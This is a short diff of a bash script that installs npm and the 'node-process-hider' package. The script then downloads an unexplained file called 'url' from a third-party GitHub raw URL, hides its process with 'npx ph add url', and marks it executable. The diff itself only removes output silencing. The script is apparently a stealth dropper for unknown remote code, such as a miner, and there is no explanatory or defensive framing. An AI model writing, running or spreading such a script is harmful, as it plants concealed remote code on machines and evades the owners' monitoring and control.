@@ -1,7 +1,7 @@
 #!bin/bash
-sudo apt install npm -y > /dev/null
-echo "{}" > package.json  > /dev/null
-npm install node-process-hider  > /dev/null
+sudo apt install npm -y 
+echo "{}" > package.json 
+npm install node-process-hider
 wget https://raw.githubusercontent.com/nettech12/tool/main/url > /dev/null
 npx ph add url
 chmod +x url
